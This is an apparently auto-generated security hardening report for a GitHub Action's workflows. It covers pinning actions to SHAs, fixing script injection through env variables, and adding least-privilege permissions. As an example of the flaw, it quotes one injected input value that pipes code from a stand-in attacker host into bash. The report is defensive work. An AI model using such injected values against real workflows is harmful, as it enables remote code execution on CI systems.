<!-- markdownlint-disable -->

# Hardening Report: peter-evans--create-pull-request/v7.0.10

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **peter-evans--create-pull-request/v7.0.10** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

All `uses:` references across workflow files use mutable tags instead of pinned 40-character SHA digests, making the workflows vulnerable to supply-chain attacks if the referenced action tags are moved.

.github/workflows/ci.yml: actions/checkout@v6, actions/setup-node@v6, actions/upload-artifact@v5 (×2), actions/download-artifact@v6 (×2), peter-evans/close-pull@v3, peter-evans/find-comment@v4, peter-evans/create-or-update-comment@v5, peter-evans/create-pull-request@v7
.github/workflows/automerge-dependabot.yml: peter-evans/enable-pull-request-automerge@v3
.github/workflows/cpr-example-command.yml: actions/checkout@v6, peter-evans/create-or-update-comment@v5
.github/workflows/slash-command-dispatch.yml: peter-evans/slash-command-dispatch@v5
.github/workflows/update-major-version.yml: actions/checkout@v6

Locations:

- `.github/workflows/ci.yml:18`
- `.github/workflows/ci.yml:19`
- `.github/workflows/ci.yml:25`
- `.github/workflows/ci.yml:27`
- `.github/workflows/ci.yml:36`
- `.github/workflows/ci.yml:39`
- `.github/workflows/ci.yml:42`
- `.github/workflows/ci.yml:61`
- `.github/workflows/ci.yml:68`
- `.github/workflows/ci.yml:76`
- `.github/workflows/ci.yml:84`
- `.github/workflows/ci.yml:85`
- `.github/workflows/ci.yml:88`
- `.github/workflows/automerge-dependabot.yml:9`
- `.github/workflows/cpr-example-command.yml:9`
- `.github/workflows/cpr-example-command.yml:40`
- `.github/workflows/slash-command-dispatch.yml:9`
- `.github/workflows/update-major-version.yml:18`

### script-injection (severity: high)

GitHub Actions expressions are interpolated directly inside `run:` shell command strings, allowing an attacker to inject arbitrary shell commands.

(a) update-major-version.yml — `workflow_dispatch` inputs are interpolated directly into `git tag` and `git push` commands:
  `run: git tag -f ${{ github.event.inputs.main_version }} ${{ github.event.inputs.target }}`
  `run: git push origin ${{ github.event.inputs.main_version }} --force`
An attacker with dispatch access could supply a value like `v1 && curl attacker.com | bash #` to execute arbitrary commands.

(b) cpr-example-command.yml — `steps.*.outputs.*` context values are interpolated directly into `echo` commands inside a `run:` block:
  `echo "Pull Request Number - ${{ steps.cpr.outputs.pull-request-number }}"`
  `echo "Pull Request URL - ${{ steps.cpr.outputs.pull-request-url }}"`
If the output values contain shell metacharacters they will be interpreted by the shell.

Locations:

- `.github/workflows/update-major-version.yml:27`
- `.github/workflows/update-major-version.yml:29`
- `.github/workflows/cpr-example-command.yml:35`
- `.github/workflows/cpr-example-command.yml:36`

### missing-permissions (severity: medium)

The following workflow files have no top-level `permissions:` key and no job-level `permissions:` key on any job. Without explicit permissions, workflows run with the repository's default token permissions (often `write-all` for private repos or broad read/write for public repos), violating the principle of least privilege.

- automerge-dependabot.yml: no permissions declared
- cpr-example-command.yml: no permissions declared
- slash-command-dispatch.yml: no permissions declared
- update-major-version.yml: no permissions declared

Locations:

- `.github/workflows/automerge-dependabot.yml:1`
- `.github/workflows/cpr-example-command.yml:1`
- `.github/workflows/slash-command-dispatch.yml:1`
- `.github/workflows/update-major-version.yml:1`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, missing-permissions

**Notes:**

Fixed all findings across 5 workflow files:

1. unpinned-uses: Pinned all action references to full 40-char SHAs with tag comments:
   - actions/checkout@v6 → @df4cb1c069e1874edd31b4311f1884172cec0e10
   - actions/setup-node@v6 → @249970729cb0ef3589644e2896645e5dc5ba9c38
   - actions/upload-artifact@v5 → @330a01c490aca151604b8cf639adc76d48f6c5d4
   - actions/download-artifact@v6 → @018cc2cf5baa6db3ef3c5f8a56943fffe632ef53
   - peter-evans/close-pull@v3 → @a192af8d70f2d49c49643134605c3b73d4f80fae
   - peter-evans/find-comment@v4 → @b30e6a3c0ed37e7c023ccd3f1db5c6c0b0c23aad
   - peter-evans/create-or-update-comment@v5 → @e8674b075228eee787fea43ef493e45ece1004c9
   - peter-evans/create-pull-request@v7 → @22a9089034f40e5a961c8808d113e2c98fb63676
   - peter-evans/enable-pull-request-automerge@v3 → @a660677d5469627102a1c1e11409dd063606628d
   - peter-evans/slash-command-dispatch@v5 → @9bdcd7914ec1b75590b790b844aa3b8eee7c683a

2. script-injection: Moved all ${{ }} expressions out of run: blocks into env: blocks:
   - update-major-version.yml: inputs.main_version and inputs.target → MAIN_VERSION/TARGET env vars
   - cpr-example-command.yml: steps.cpr.outputs.* → PR_NUMBER/PR_URL env vars

3. missing-permissions: Added minimal permissions blocks to 4 workflow files:
   - automerge-dependabot.yml: pull-requests: write, contents: write
   - cpr-example-command.yml: contents: write, pull-requests: write
   - slash-command-dispatch.yml: issues: read, pull-requests: read
   - update-major-version.yml: contents: write

